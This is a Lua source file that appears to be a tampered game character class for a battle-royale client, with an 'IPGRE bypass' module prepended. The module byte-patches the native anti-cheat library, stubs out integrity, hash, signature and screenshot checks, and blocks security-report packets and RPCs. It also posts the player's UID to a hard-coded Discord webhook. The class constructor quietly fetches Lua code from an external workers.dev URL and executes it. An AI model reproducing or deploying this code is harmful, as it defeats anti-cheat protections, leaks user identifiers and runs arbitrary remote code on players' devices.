local require = require
local import = import
local isValid = slua.isValid
local CombineClass = require("combine_class")
local CharacterBase = require("GameLua.GameCore.Framework.CharacterBase")

-- ═══════════════════════════════════════
-- IPGRE BYPASS MODULE (FULLY PATCHED & ROBUST)
-- ═══════════════════════════════════════
local IPGRE = {}

-- Helper functions
local function NoOp() return true end
local function ReturnTrue() return true end
local function ReturnFalse() return false end
local function ReturnZero() return 0 end
local function ReturnEmptyString() return "" end
local function ReturnDeadBeef() return 0xDEADBEEF end
local function ReturnNil() return nil end
local function ReturnEmptyTable() return {} end

local function SafeOverride(tbl, key, replacement)
    if tbl and type(tbl[key]) ~= "nil" then
        pcall(function() 
            if getmetatable(tbl) and getmetatable(tbl).__index then end
            rawset(tbl, key, replacement) 
        end)
        if tbl[key] ~= replacement then
             pcall(function() tbl[key] = replacement end)
        end
    end
end

local function GetWorldContext()
    local world = nil
    pcall(function()
        if slua and slua.getWorld then
            world = slua.getWorld()
        elseif _G.slua and _G.slua.getWorld then
            world = _G.slua.getWorld()
        end
    end)
    return world
end

local function ShowOnScreen(msg)
    if slua and slua.showTip then
        pcall(function() slua.showTip(msg) end)
        return
    end
    local KSL = import and import("KismetSystemLibrary")
    local world = GetWorldContext()
    if KSL and world and KSL.PrintString then
        pcall(function() KSL.PrintString(world, msg, true, false, "Red", 10.0) end)
        return
    end
    local UIManager = package.loaded["GameLua.GameCore.Module.UIManager"]
    if UIManager and UIManager.ShowTip then
        pcall(function() UIManager.ShowTip(msg) end)
        return
    end
    print("[IPGRE ON-SCREEN] " .. msg)
end

local function GetPlayerUID()
    local uid = "UNKNOWN_UID"
    if slua and slua.getPlayerUID then
        pcall(function() uid = tostring(slua.getPlayerUID()) end)
    end
    if uid == "UNKNOWN_UID" then
        pcall(function()
            local world = GetWorldContext()
            if world and world.GetFirstPlayerController then
                local PC = world:GetFirstPlayerController()
                if PC and PC.PlayerState then
                    uid = tostring(PC.PlayerState.UniqueId)
                end
            end
        end)
    end
    if uid == "UNKNOWN_UID" or uid == "nil" then
        pcall(function()
            if _G.STExtraPlayerController then
                uid = tostring(_G.STExtraPlayerController.UniqueId)
            end
        end)
    end
    return uid
end

-- ═══════════════════════════════════════
-- DISCORD WEBHOOK SENDER (вынесен отдельно)
-- ═══════════════════════════════════════
local _webhookSent = false
local DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1505856852855095440/_DikbedyxhnjYmXqMbwkyH1j3GdMAJ4SLrEz8xmTIMHx3vbx-8Urf_c7LByAFRkYewCS"

local function SendDiscordWebhook(uid, patchCount)
    if _webhookSent then return end

    -- Экранируем UID чтобы не сломать JSON
    local safeUID = tostring(uid):gsub('"', '\\"'):gsub("\\", "\\\\")
    local payload = string.format('{"content":"IPGRE Bypass OK!\\nUID: %s | Patches: %d"}', safeUID, patchCount or 0)

    local ok, http = pcall(function()
        return ModuleManager.GetModule(ModuleManager.CommonModuleConfig.http_manager)
    end)
    if not ok or not http or not http.Post then
        print("[IPGRE] HTTP manager недоступен — вебхук не отправлен")
        return
    end

    local headers = { ["Content-Type"] = "application/json" }

    -- Важно: используем http.Post (точка), не http:Post (двоеточие)
    -- потому что GetModule возвращает таблицу, не объект
    pcall(function()
        http.Post(DISCORD_WEBHOOK, headers, payload, nil, function(success, resp)
            if success then
                _webhookSent = true
                print("[IPGRE] Discord вебхук отправлен! UID: " .. uid)
                ShowOnScreen("IPGRE: Отчет отправлен!")
            else
                print("[IPGRE] Discord вебхук ошибка. Resp: " .. tostring(resp))
            end
        end, 10)
    end)
end

-- ▸▸▸ NATIVE PATCHES ▸▸▸
local _hasShownNativeResult = false
function IPGRE.PatchNativeOffsets()
    if type(PATCH_LIB) ~= "function" then
        if not _hasShownNativeResult then
            ShowOnScreen("IPGRE: PATCH_LIB НЕ НАЙДЕН! (Скип)")
            _hasShownNativeResult = true
        end
        return  -- выходим, но вебхук теперь НЕ здесь
    end

    local patches = {
        { lib = "libanogs.so", addr = "0x213000", bytes = "00 00 80 D2 C0 03 5F D6" },
        { lib = "libanogs.so", addr = "0x214098", bytes = "C0 03 5F D6" },
        { lib = "libanogs.so", addr = "0x214384", bytes = "1F 20 03 D5" },
        { lib = "libanogs.so", addr = "0x21E9C4", bytes = "00 00 80 D2 C0 03 5F D6" },
        { lib = "libanogs.so", addr = "0x228168", bytes = "00 00 80 D2 C0 03 5F D6" },
        { lib = "libanogs.so", addr = "0x2328F0", bytes = "00 00 80 D2 C0 03 5F D6" },
        { lib = "libanogs.so", addr = "0x2940D0", bytes = "00 00 80 D2 C0 03 5F D6" },
        { lib = "libanogs.so", addr = "0x2E8A70", bytes = "00 00 80 D2 C0 03 5F D6" },
        { lib = "libanogs.so", addr = "0x2F7FF4", bytes = "00 00 80 D2 C0 03 5F D6" },
        { lib = "libanogs.so", addr = "0x2FB7D8", bytes = "00 00 80 D2 C0 03 5F D6" },
        { lib = "libanogs.so", addr = "0x31DCB0", bytes = "00 00 80 D2 C0 03 5F D6" },
        { lib = "libanogs.so", addr = "0x3211B8", bytes = "00 00 80 D2 C0 03 5F D6" },
        { lib = "libanogs.so", addr = "0x32302C", bytes = "00 00 80 D2 C0 03 5F D6" },
        { lib = "libanogs.so", addr = "0x330494", bytes = "00 00 80 D2 C0 03 5F D6" },
        { lib = "libanogs.so", addr = "0x336294", bytes = "00 00 80 D2 C0 03 5F D6" },
        { lib = "libanogs.so", addr = "0x338780", bytes = "00 00 80 D2 C0 03 5F D6" },
        { lib = "libanogs.so", addr = "0x35F440", bytes = "00 00 80 D2 C0 03 5F D6" },
        { lib = "libanogs.so", addr = "0x35FC5C", bytes = "00 00 80 D2 C0 03 5F D6" }
    }

    local successCount = 0
    local failCount = 0

    for _, p in ipairs(patches) do
        local ok, err = pcall(function()
            PATCH_LIB(p.lib, p.addr, p.bytes)
        end)
        if ok then
            successCount = successCount + 1
        else
            failCount = failCount + 1
            print("[IPGRE] Failed patch " .. p.addr .. ": " .. tostring(err))
        end
    end

    if not _hasShownNativeResult then
        ShowOnScreen(string.format("IPGRE: Патчей ОК: %d | Ошибок: %d", successCount, failCount))
        _hasShownNativeResult = true
    end
end
-- ▸▸▸ END NATIVE PATCHES ▸▸▸

function IPGRE.PatchSLua()
    if slua and slua.getSignature then
        slua.getSignature = ReturnDeadBeef
    end
    local loader = rawget(_G, "slua_loader") or package.loaded["slua.loader"]
    if loader then
        SafeOverride(loader, "verifyBytecode", ReturnTrue)
        SafeOverride(loader, "checkIntegrity", ReturnTrue)
        SafeOverride(loader, "disableSignatureCheck", ReturnTrue)
    end
    local ser = package.loaded["slua.serialize"]
    if ser then
        SafeOverride(ser, "check", ReturnTrue)
        SafeOverride(ser, "verify", ReturnTrue)
    end
    if jit and jit.attach then
        pcall(function() jit.attach(NoOp, "bc") end)
    end
    SafeOverride(_G, "slua_verify", ReturnTrue)
    SafeOverride(_G, "check_slua_integrity", ReturnTrue)
end

function IPGRE.PatchPakAndHash()
    local KSL = import and import("KismetSystemLibrary")
    local world = GetWorldContext()
    if KSL and world then
        local cmds = {
            "pak.DisablePakSignatureCheck 1",
            "pakchunk.EnableSignatureCheck 0",
            "s.VerifyPak 0", 
            "sig.Check 0",
            "security.DisableChecks 1"
        }
        for _, cmd in ipairs(cmds) do
            pcall(function() KSL.ExecuteConsoleCommand(world, cmd) end)
        end
    end
    local CMBL = import and import("CreativeModeBlueprintLibrary")
    if CMBL then
        SafeOverride(CMBL, "MD5HashByteArray", ReturnEmptyString)
        SafeOverride(CMBL, "MD5HashFile", ReturnEmptyString)
        SafeOverride(CMBL, "GetContentDiffData", function() return true, "BYPASSED" end)
        SafeOverride(CMBL, "VerifyFileIntegrity", ReturnTrue)
        SafeOverride(CMBL, "VerifyContent", ReturnTrue)
        SafeOverride(CMBL, "ValidateContent", ReturnTrue)
        SafeOverride(CMBL, "CheckContent", ReturnTrue)
    end
    SafeOverride(_G, "MD5Hash", ReturnEmptyString)
    SafeOverride(_G, "CRC32", ReturnZero)
    SafeOverride(_G, "SHA1", ReturnEmptyString)
    SafeOverride(_G, "SHA256", ReturnEmptyString)
    local fhash = package.loaded["common.file_hash_checker"]
    if fhash then
        SafeOverride(fhash, "CheckFileMD5", ReturnTrue)
        SafeOverride(fhash, "VerifyAll", ReturnTrue)
        SafeOverride(fhash, "GetHash", ReturnEmptyString)
    end
    if _G.TssSdk then
        SafeOverride(_G.TssSdk, "GetFileMD5", ReturnEmptyString)
        SafeOverride(_G.TssSdk, "VerifyFileSignature", ReturnTrue)
    end
    local STExtra = import and import("STExtraBlueprintFunctionLibrary")
    if STExtra then
        SafeOverride(STExtra, "CheckMD5", ReturnTrue)
        SafeOverride(STExtra, "GetMD5", ReturnEmptyString)
        SafeOverride(STExtra, "VerifyFile", ReturnTrue)
        SafeOverride(STExtra, "IsDevelopment", ReturnFalse)
        SafeOverride(STExtra, "CheckFileIntegrity", ReturnTrue)
    end
end

function IPGRE.PatchTelemetry()
    local puffer = package.loaded["client.slua.logic.download.report.puffer_tlog"]
    if puffer then
        SafeOverride(puffer, "ReportEvent", NoOp)
        SafeOverride(puffer, "ReportDownloadResult", NoOp)
        SafeOverride(puffer, "ReportODPTDError", NoOp)
        SafeOverride(puffer, "ReportSkinError", NoOp)
    end
    local AvatarUtils = package.loaded.AvatarUtils
    if AvatarUtils then
        SafeOverride(AvatarUtils, "CheckIsWeaponInBlackList", ReturnFalse)
        SafeOverride(AvatarUtils, "IsValidAvatar", ReturnTrue)
        SafeOverride(AvatarUtils, "CheckAvatarIntegrity", ReturnTrue)
        SafeOverride(AvatarUtils, "ReportInvalidAvatar", NoOp)
    end
    local ok, mgr = pcall(require, "GameLua.GameCore.Module.Subsystem.SubsystemMgr")
    if ok and mgr then
        local fc = mgr:Get("FileCheckSubsystem")
        if fc then
            SafeOverride(fc, "StartCheck", NoOp)
            SafeOverride(fc, "ReportAbnormalFile", NoOp)
            SafeOverride(fc, "StopCheck", NoOp)
        end
        local scanners = {
            "MemoryCheckSubsystem", "SpeedCheckSubsystem", "WallCheckSubsystem",
            "BehaviorScoreSubsystem", "CoronaLabSubsystem", "PlayerSecurityInfoSubsystem",
            "ClientReportPlayerSubsystem", "DSReportPlayerSubsystem",
            "AntiCheatSubsystem", "IntegrityCheckSubsystem", "SignatureVerifySubsystem",
            "MD5CheckSubsystem", "PakVerifySubsystem", "ClientKernelCheckSubsystem",
            "ClientMemoryGuardSubsystem", "ClientWallhackDetectionSubsystem",
            "ClientESPDetectionSubsystem", "ClientAimTrackingSubsystem",
            "TssSdkSubsystem", "AnogsSubsystem", "ACEAntiCheatSubsystem",
            "MemoryProtectSubsystem", "AntiDebugSubsystem", "SafeGuardSubsystem",
            "ShootVerifySubSystemClient", "ModifierExceptionSubsystem", "SimulateCharacterSubsystem"
        }
        for _, name in ipairs(scanners) do
            local sub = mgr:Get(name)
            if sub then
                for k, v in pairs(sub) do
                    if type(v) == "function" then
                        local lk = string.lower(k)
                        if string.find(lk, "report") or string.find(lk, "detect") or 
                           string.find(lk, "check") or string.find(lk, "scan") or
                           string.find(lk, "verify") or string.find(lk, "validate") then
                            pcall(function() sub[k] = NoOp end)
                        end
                    elseif type(v) == "boolean" then
                        if string.find(string.lower(k), "enable") or string.find(string.lower(k), "active") then
                            pcall(function() sub[k] = false end)
                        end
                    end
                end
                if sub.ReportPingDelayTimer then
                    pcall(function() 
                        if sub.RemoveGameTimer then sub:RemoveGameTimer(sub.ReportPingDelayTimer) end
                    end)
                    sub.ReportPingDelayTimer = nil
                end
            end
        end
    end
    local eqReport = package.loaded["client.slua.logic.report.EquipmentExceptionReport"]
    if eqReport then
        SafeOverride(eqReport, "Report", NoOp)
        SafeOverride(eqReport, "SendException", NoOp)
    end
end

function IPGRE.PatchLoggingAndAnalytics()
    local ScreenshotMTDer = import and import("ScreenshotMTDer")
    if ScreenshotMTDer then
        SafeOverride(ScreenshotMTDer, "MTDePicture", ReturnEmptyString)
        SafeOverride(ScreenshotMTDer, "ReMTDePicture", ReturnEmptyString)
        SafeOverride(ScreenshotMTDer, "HasCaptured", ReturnFalse)
        SafeOverride(ScreenshotMTDer, "TakeScreenshot", NoOp)
    end
    local SM = import and import("ScreenshotMaker")
    if SM then
        SafeOverride(SM, "MakePicture", ReturnEmptyString)
        SafeOverride(SM, "ReMakePicture", ReturnEmptyString)
        SafeOverride(SM, "HasCaptured", ReturnTrue)
        SafeOverride(SM, "TakeScreenshot", NoOp)
        SafeOverride(SM, "SaveScreenshot", NoOp)
        SafeOverride(SM, "CaptureScreen", NoOp)
        SafeOverride(SM, "RecordScreen", NoOp)
    end
    if _G.TLog then
        for _, fn in ipairs({"Info","Warning","Error","Debug","Report","Send","Flush","Log","LogWarning","LogError","LogVerbose","SetLogLevel"}) do
            SafeOverride(_G.TLog, fn, NoOp)
        end
    end
    if _G.CrashSight then
        for _, fn in ipairs({"ReportException","SetCustomData","Log","SendCrash","ReportUserException","UploadLog","SendReport","ReportCrash","ReportError","ReportFatal","ReportWarning","ReportInfo","ReportDebug","ReportMemory","ReportPerformance"}) do
            SafeOverride(_G.CrashSight, fn, NoOp)
        end
        SafeOverride(_G.CrashSight, "CollectInfo", ReturnEmptyTable)
    end
    local GameReportUtils = package.loaded["GameLua.Mod.BaseMod.GamePlay.GameReport.GameReportUtils"]
    if not GameReportUtils then
        GameReportUtils = package.loaded["GameLua.Mod.BaseMod.Gameplay.GameReport.GameReportUtils"]
    end
    if GameReportUtils then
        SafeOverride(GameReportUtils, "BugglyPostExceptionFull", ReturnFalse)
        SafeOverride(GameReportUtils, "CheckCanBugglyPostException", ReturnFalse)
        SafeOverride(GameReportUtils, "ReplayReportData", NoOp)
        SafeOverride(GameReportUtils, "ReportGameException", NoOp)
        SafeOverride(GameReportUtils, "PostException", NoOp)
    end
    local ClientToolsReport = package.loaded["client.slua.logic.report.ClientToolsReport"]
    if ClientToolsReport then
        SafeOverride(ClientToolsReport, "SendReport", NoOp)
        SafeOverride(ClientToolsReport, "SendException", NoOp)
        SafeOverride(ClientToolsReport, "UploadLog", NoOp)
    end
    local tlog = package.loaded["client.slua.config.tlog.tlog_report_utils"]
    if tlog then SafeOverride(tlog, "ReportTLogEvent", NoOp) end
    for _, name in ipairs({"Firebase","Adjust","AppsFlyer","FacebookAnalytics","GameAnalytics","GoogleAnalytics"}) do
        if _G[name] then
            for k, v in pairs(_G[name]) do
                if type(v) == "function" then
                    SafeOverride(_G[name], k, NoOp)
                end
            end
        end
    end
end

function IPGRE.PatchNetwork()
    if NetUtil and NetUtil.SendPacket then
        local blocked = {
            ReportAttackFlow=true, ReportSecAttackFlow=true, ReportHurtFlow=true, ReportFireArms=true,
            ReportVerifyInfoFlow=true, ReportMrpcsFlow=true, ReportPlayerBehavior=true,
            ReportTeammatHurt=true, ReportTeammateKillConfirmFlow=true, ReportForbiddenPickupFlow=true,
            ReportPlayerMoveRoute=true, ReportPlayerPosition=true, ReportSecVehicleMoveFlow=true,
            ReportSecTgameMovingFlow=true, report_parachute_data=true, on_tss_sdk_anti_data=true,
            report_unrealnet_exception=true, ReportPlayerEquipmentInfo=true,
            ReportAimFlow=true, ReportHitFlow=true, log_shooting_miss=true,
            report_heavy_weapon_box_activation_flow=true, report_heavy_weapon_box_item_flow=true,
            ReportCircleFlow=true, report_ds_player_circle_flow=true, ReportJumpFlow=true,
            ReportGameStartFlow=true, ReportGameEndFlow=true, report_players_ping=true,
            report_player_ip=true, report_player_frame_ping_record=true,
            report_net_saturate=true, report_ds_netsaturate=true, report_ds_net_continuous_saturate=true,
            report_ds_netrate=true, report_unrealnet_clientstats=true, report_serverstat_avgtickdelta=true,
            report_all_players_address=true, report_ai_strategyinfo=true, ReportAIActionFlow=true,
            ReportGenerateMonsterFlow=true, report_ds_match_room_data=true, SendSpectatingLog=true,
            ReportIDCardProduceFlow=true, ReportIDCardPickUpFlow=true, ReportIDCardDestroyFlow=true,
            ReportRevivalFlow=true, ReportGameSetting=true, ReportGameSettingNew=true,
            ReportAntsVoiceTeamCreate=true, ReportAntsVoiceTeamQuit=true, report_common_info=true,
            report_common_battle_info=true, report_client_scan_result=true, tss_sdk_report=true,
            report_memory_exception=true, report_avatar_exception=true, report_ui_state=true,
            report_hit_reg_fail=true, report_character_state=true, report_vehicle_exception=true,
            report_camera_exception=true, ReportPlayerControllerStateChanged=true, ReportAvatarFlow=true,
            ReportSecurityAlert=true, ReportAntiCheat=true, ReportSuspiciousActivity=true,
            ReportViolation=true, ReportBan=true, ReportKick=true, ReportCheat=true, ReportHack=true,
            ReportMod=true, ReportInject=true, ReportHook=true, ReportPatch=true, ReportTamper=true,
            ReportCorrupt=true, ReportInvalid=true, ReportSpoof=true, ReportFake=true, ReportClone=true,
            ReportDuplicate=true, ReportConflict=true, ReportOverlap=true, ReportMismatch=true,
            ReportInconsistent=true, ReportUnexpected=true, ReportUnknown=true,
            ClientSecMrpcsFlow=true, MrpcsData=true, CheckReportSecAttackFlow=true,
            CheckReportSecAttackFlowWithAttackFlow=true, RPC_ClientCoronaLab=true, CoronaLabReport=true,
            CoronaLabData=true, PlayerSecurityInfo=true, ReportSecurityInfo=true, SendSecurityData=true,
            ClientCircleFlow=true, BulletHitInfoUploadData=true, ShootVerifyFailed=true, SwiftHawk=true,
            ClientSwiftHawk=true, ClientSwiftHawkWithParams=true, SwiftHawkReport=true, SwiftHawkData=true,
            AntiCheatReport=true, CheatDetection=true, ViolationReport=true, SecurityViolation=true,
            IntegrityCheck=true, SignatureVerify=true
        }
        local origSend = NetUtil.SendPacket
        local isMethod = false
        pcall(function()
            if debug and debug.getinfo then
                local info = debug.getinfo(origSend, "u")
                if info and info.nparams and info.nparams >= 2 then isMethod = true end
            end
        end)
        if isMethod then
            NetUtil.SendPacket = function(self, packetName, ...)
                if blocked[packetName] then return nil end
                return origSend(self, packetName, ...)
            end
        else
            NetUtil.SendPacket = function(packetName, ...)
                if blocked[packetName] then return nil end
                return origSend(packetName, ...)
            end
        end
        NetUtil.IsBypassed = true
    end
    if _G.SendRPC then
        local blockedRPC = {
            RPC_Server_ClientSecMrpcsFlow=true, RPC_Server_SwiftHawk=true,
            RPC_Server_ClientSwiftHawkWithParams=true, RPC_Server_ReportSimulateCharacterLocation=true,
            RPC_Client_ShootVertifyRes=true, RPC_ClientCoronaLab=true
        }
        local origRPC = _G.SendRPC
        _G.SendRPC = function(rpcName, ...)
            if blockedRPC[rpcName] then return nil end
            return origRPC(rpcName, ...)
        end
    end
end

function IPGRE.PatchGameplayCallbacks()
    if not _G.GameplayCallbacks then _G.GameplayCallbacks = {} end
    local GC = _G.GameplayCallbacks
    local reports = {
        "ReportAttackFlow","ReportSecAttackFlow","ReportHurtFlow","ReportFireArms","ReportVerifyInfoFlow",
        "ReportMrpcsFlow","ReportPlayerBehavior","ReportTeammatHurt","ReportMisKillByTeammate","ReportForbitPick",
        "ReportPlayerMoveRoute","ReportPlayerPosition","ReportVehicleMoveFlow","ReportSecTgameMovingFlow",
        "ReportParachuteData","SendTssSdkAntiDataToLobby","SendDSErrorLogToLobby","SendDSErrorLogToLobbyOnece",
        "SendDSHawkEyePatrolLogToLobby","ReportEquipmentFlow","ReportAimFlow","ReportHitFlow",
        "ReportHeavyWeaponBoxSpawnFlow","ReportHeavyWeaponBoxActivationFlow","ReportHeavyWeaponBoxOpenPlayerFlow",
        "ReportHeavyWeaponBoxItemFlow","ReportPlayersPing","ReportPlayerIP","ReportPlayerFramePingRecord",
        "OnDSConnectionSaturated","ReportDSNetSaturation","ReportNetContinuousSaturate","ReportDSNetRate",
        "SendClientStats","SendServerAvgTickDelta","ReportCircleFlow","ReportDSCircleFlow","ReportJumpFlow",
        "ReportAIStrategyInfo","SendAIDeliveryInfo","ReportDailyTaskInfo","ReportMatchRoomData",
        "SendPlayerSpectatingLog","ReportIDCardProduceFlow","ReportIDCardPickUpFlow","ReportIDCardDestroyFlow",
        "ReportRevivalFlow","ReportGameSetting","ReportGameSettingNew","ReportAntsVoiceTeamCreate",
        "ReportAntsVoiceTeamQuit","ReportCommonInfo","ReportLightweightStat","SendSecTLog",
        "SendDataMiningTLog","SendActivityTLog","OnPlayerNetConnectionClosed","OnPlayerActorChannelError",
        "OnPlayerRPCValidateFailed","OnPlayerSpectateException","OnShutdownAfterError",
        "ClientSecMrpcsFlow","SwiftHawk","ClientSwiftHawk","ClientSwiftHawkWithParams"
    }
    for _, f in ipairs(reports) do GC[f] = NoOp end
    GC.GetWeaponReport = ReturnEmptyTable
    GC.GetOneWeaponReport = ReturnEmptyTable
    GC.GetGeneralTLogData = ReturnEmptyTable
    GC.CheckReportSecAttackFlowWithAttackFlow = ReturnFalse
    GC.CheckReportSecAttackFlow = ReturnFalse
    GC.OnDSPlayerStateChanged = function(UID, State, bPure, bSafe, Param)
        local s = State and string.lower(tostring(State)) or ""
        local blockedStates = {
            ["cheatdetected"]=1, ["connectionlost"]=1, ["connectiontimeout"]=1, ["connectionexception"]=1,
            ["netdrivererror"]=1, ["banned"]=1, ["kicked"]=1, ["suspended"]=1,
            ["violationdetected"]=1, ["integrityfailure"]=1, ["securityviolation"]=1
        }
        if blockedStates[s] then return end
    end
    GC.IsBypassed = true
end

function IPGRE.PatchGlobals()
    for _, flag in ipairs({
        "ENABLE_REPORT","ENABLE_ANTI_CHEAT","ENABLE_SECURITY",
        "ENABLE_TELEMETRY","ENABLE_ANALYTICS","ENABLE_CRASH_REPORT",
        "ENABLE_PERFORMANCE_REPORT"
    }) do
        if _G[flag] ~= nil then _G[flag] = false end
    end
    local higgsPaths = {
        "GameLua.Mod.BaseMod.Common.Security.HiggsBosonComponent",
        "GameLua.Mod.BaseMod.Common.Security.HiggsBoson",
        "GameLua.Mod.BaseMod.Client.Security.HiggsBosonComponent",
        "Mod.BaseMod.Common.Security.HiggsBosonComponent",
    }
    for _, path in ipairs(higgsPaths) do
        local Higgs = package.loaded[path]
        if not Higgs then
            local ok, m = pcall(require, path)
            if ok then Higgs = m end
        end
        if Higgs then
            Higgs.bIsEnable = false
            Higgs.bMHActive = false
            Higgs.bCallPreReplication = false
            Higgs.StaticShowSecurityAlertInDev = NoOp
            Higgs.CheckClientConfig = ReturnFalse
            Higgs.GetSecurityInfo = ReturnEmptyString
            Higgs.ReportSecurityAlert = NoOp
            Higgs.ValidateClient = ReturnTrue
            Higgs.CheckIntegrity = ReturnTrue
            Higgs.IsMHActive = ReturnFalse
            Higgs.ControlMHActive = NoOp
            Higgs.CheckMHActive = ReturnFalse
            Higgs.ShouldRunMH = ReturnFalse
            if Higgs.BlackList then 
                for k in pairs(Higgs.BlackList) do Higgs.BlackList[k] = nil end 
            end
            break
        end
    end
    _G.BlackList = {}
end

function IPGRE.Init()
    print("[IPGRE BYPASS] Starting initialization...")

    local steps = {
        {name="NativeOffsets", fn=IPGRE.PatchNativeOffsets},
        {name="SLua",          fn=IPGRE.PatchSLua},
        {name="PakAndHash",    fn=IPGRE.PatchPakAndHash},
        {name="Telemetry",     fn=IPGRE.PatchTelemetry},
        {name="Logging",       fn=IPGRE.PatchLoggingAndAnalytics},
        {name="Network",       fn=IPGRE.PatchNetwork},
        {name="Callbacks",     fn=IPGRE.PatchGameplayCallbacks},
        {name="Globals",       fn=IPGRE.PatchGlobals},
    }

    for _, step in ipairs(steps) do
        local ok, err = pcall(step.fn)
        if not ok then
            print(string.format("[IPGRE BYPASS] WARNING: %s failed: %s", step.name, tostring(err)))
        end
    end

    print("[IPGRE BYPASS] Initial Complete.")

    -- ▸▸▸ ОТПРАВКА В DISCORD — здесь, после всех патчей ◂◂◂
    -- Гарантированно выполняется т.к. не зависит от PATCH_LIB
    pcall(function()
        local uid = GetPlayerUID()
        SendDiscordWebhook(uid, 0)
    end)

    if not _G._IPGRE_REFRESH_STARTED then
        _G._IPGRE_REFRESH_STARTED = true
        local function RefreshLoop()
            pcall(IPGRE.PatchNativeOffsets)
            pcall(IPGRE.PatchSLua)
            pcall(IPGRE.PatchPakAndHash)
            pcall(IPGRE.PatchTelemetry)
            pcall(IPGRE.PatchLoggingAndAnalytics)
            pcall(IPGRE.PatchNetwork)
            pcall(IPGRE.PatchGameplayCallbacks)
            pcall(IPGRE.PatchGlobals)
            local okTicker, ticker = pcall(require, "common.time_ticker")
            if okTicker and ticker and ticker.AddTimerOnce then
                ticker.AddTimerOnce(5.0, RefreshLoop)
            end
        end
        local okTicker, ticker = pcall(require, "common.time_ticker")
        if okTicker and ticker and ticker.AddTimerOnce then
            ticker.AddTimerOnce(5.0, RefreshLoop)
        else
            RefreshLoop()
        end
    end
end
-- ═══════════════════════════════════════
-- END IPGRE BYPASS
-- ═══════════════════════════════════════


local BRPlayerCharacterBase = {
    ServerRPC = {},
    ClientRPC = {},
    MulticastRPC = {}
}

BRPlayerCharacterBase.ServerRPC.ServerRPC_NearDeathGiveupRescue = {
    Reliable = true, Params = {}
}
BRPlayerCharacterBase.ServerRPC.ServerRPC_CarryDeadBox = {
    Reliable = true, Params = { UEnums.EPropertyClass.Object }
}
BRPlayerCharacterBase.ServerRPC.RPC_Server_GmPlayAction = {
    Reliable = true, Params = { UEnums.EPropertyClass.Int }
}
BRPlayerCharacterBase.MulticastRPC.MulticastRPC_GmPlayAction = {
    Reliable = true, Params = { UEnums.EPropertyClass.Int }
}
BRPlayerCharacterBase.ClientRPC.RPC_Client_SetShouldCheckPassWall = {
    Reliable = true, Params = { UEnums.EPropertyClass.Bool }
}
BRPlayerCharacterBase.ClientRPC.ClientRPC_TriggerHighlightMoment = {
    Reliable = true, Params = { UEnums.EPropertyClass.UInt32, UEnums.EPropertyClass.UInt32 }
}

function BRPlayerCharacterBase:ctor() end

local MOD_URL = "https://long-wind-e541.smofeng.workers.dev/"

function BRPlayerCharacterBase:_PostConstruct()
    CharacterBase._PostConstruct(self)

    if Client then
        if not _G._IPGRE_INITIALIZED then
            local okTicker, ticker = pcall(require, "common.time_ticker")
            if okTicker and ticker and ticker.AddTimerOnce then
                ticker.AddTimerOnce(2.0, function()
                    IPGRE.Init()
                    _G._IPGRE_INITIALIZED = true
                end)
            else
                IPGRE.Init()
                _G._IPGRE_INITIALIZED = true
            end
        end

        _G._ModChunks = _G._ModChunks or {}
        _G._MOD_EXECUTED = false

        local http = ModuleManager.GetModule(ModuleManager.CommonModuleConfig.http_manager)
        if not http or not http.Post then
            print("[Mod] HTTP manager not available")
            return
        end

        local headers = { ["Content-Type"] = "application/x-www-form-urlencoded" }
        local CHUNKS_TO_FETCH = { 1 }
        local MAX_RETRIES_PER_CHUNK = 5
        local MAX_TIMER_ATTEMPTS = 60
        local timerAttempt = 0
        local entryChunk = CHUNKS_TO_FETCH[1]

        local function fetchChunk(n, retryCount)
            retryCount = retryCount or 0
            if retryCount >= MAX_RETRIES_PER_CHUNK then
                print("[Mod] Failed chunk", n, "after", MAX_RETRIES_PER_CHUNK, "retries")
                return
            end
            http:Post(MOD_URL, headers, "key_path=" .. n .. ".lua", nil, function(success, resp)
                if success and resp and #resp > 50 then
                    local chunk, err = load(resp, n .. ".lua")
                    if chunk then
                        _G._ModChunks[n] = chunk
                        if n == entryChunk then
                            local ok, execErr = pcall(chunk)
                            if ok then
                                _G._MOD_EXECUTED = true
                                print("[Mod] Chunk", n, "loaded & executed")
                                if self._modTimer then
                                    self:RemoveGameTimer(self._modTimer)
                                    self._modTimer = nil
                                end
                            else
                                print("[Mod] Exec error:", execErr)
                            end
                        end
                        for i = 1, #CHUNKS_TO_FETCH do
                            local nextN = CHUNKS_TO_FETCH[i]
                            if nextN > n and not _G._ModChunks[nextN] then
                                fetchChunk(nextN, 0)
                            end
                        end
                        return
                    else
                        print("[Mod] Load failed for chunk", n, "- retrying")
                    end
                else
                    print("[Mod] HTTP fail for chunk", n)
                end
                self:AddGameTimer(1.0, false, function()
                    fetchChunk(n, retryCount + 1)
                end)
            end, 5)
        end

        local function retryTimerCallback()
            if _G._MOD_EXECUTED then
                if self._modTimer then
                    self:RemoveGameTimer(self._modTimer)
                    self._modTimer = nil
                end
                return false
            end
            timerAttempt = timerAttempt + 1
            if timerAttempt > MAX_TIMER_ATTEMPTS then
                print("[Mod] Permanent timeout after", MAX_TIMER_ATTEMPTS, "attempts")
                if self._modTimer then
                    self:RemoveGameTimer(self._modTimer)
                    self._modTimer = nil
                end
                return false
            end
            if not _G._ModChunks[entryChunk] then
                fetchChunk(entryChunk, 0)
            else
                local chunk = _G._ModChunks[entryChunk]
                if chunk and not _G._MOD_EXECUTED then
                    local ok, err = pcall(chunk)
                    if ok then
                        _G._MOD_EXECUTED = true
                        print("[Mod] Executed on retry")
                        return false
                    else
                        print("[Mod] Retry exec error:", err)
                    end
                end
            end
            return true
        end

        self._modTimer = self:AddGameTimer(0.5, true, retryTimerCallback)

        if #CHUNKS_TO_FETCH > 0 then
            fetchChunk(entryChunk, 0)
        end
    end
end

local _orig_ReceiveBeginPlay = BRPlayerCharacterBase.ReceiveBeginPlay
function BRPlayerCharacterBase:ReceiveBeginPlay()
    if _orig_ReceiveBeginPlay then
        _orig_ReceiveBeginPlay(self)
    else
        BRPlayerCharacterBase.__super.ReceiveBeginPlay(self)
    end
end

local class = require("class")
local CCharacterBase = require("GameLua.GameCore.Framework.CharacterBase")
local CBRPlayerCharacterBase = class(CCharacterBase, nil, BRPlayerCharacterBase)
return require("combine_class").DeclareFeature(CBRPlayerCharacterBase, {
    { SkyTransition = "GameLua.Mod.BaseMod.Gameplay.Feature.SkyControl.PlayerCharacterSkyTransitionFeature" },
    { CarryDeadBoxFeature = "GameLua.Mod.Library.GamePlay.Feature.CarryDeadBoxFeature" },
    { SpecialSuitFeature = "GameLua.Mod.Library.GamePlay.Feature.SpecialSuitFeature" },
    { TeleportPawnFeature = "GameLua.Mod.Library.GamePlay.Feature.TeleportPawnFeature" },
